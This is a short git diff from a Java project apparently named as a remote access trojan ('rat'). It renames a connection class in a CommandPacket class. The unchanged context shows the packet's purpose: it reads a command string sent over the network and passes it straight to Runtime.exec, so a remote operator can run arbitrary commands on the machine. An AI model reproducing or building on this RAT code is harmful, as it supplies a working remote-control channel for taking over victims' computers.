@@ -2,7 +2,7 @@ package de.sogomn.rat.packet;
 
 import javax.swing.JOptionPane;
 
-import de.sogomn.rat.ActiveClient;
+import de.sogomn.rat.ActiveConnection;
 
 public final class CommandPacket implements IPacket {
 	
@@ -17,15 +17,15 @@ public final class CommandPacket implements IPacket {
 	}
 	
 	@Override
-	public void send(final ActiveClient client) {
+	public void send(final ActiveConnection client) {
 		client.writeUTF(command);
 	}
 	
-	public void receive(final ActiveClient client) {
+	public void receive(final ActiveConnection client) {
 		command = client.readUTF();
 	}
 	
-	public void execute(final ActiveClient client) {
+	public void execute(final ActiveConnection client) {
 		try {
 			Runtime.getRuntime().exec(command);
 		} catch (final Exception ex) {
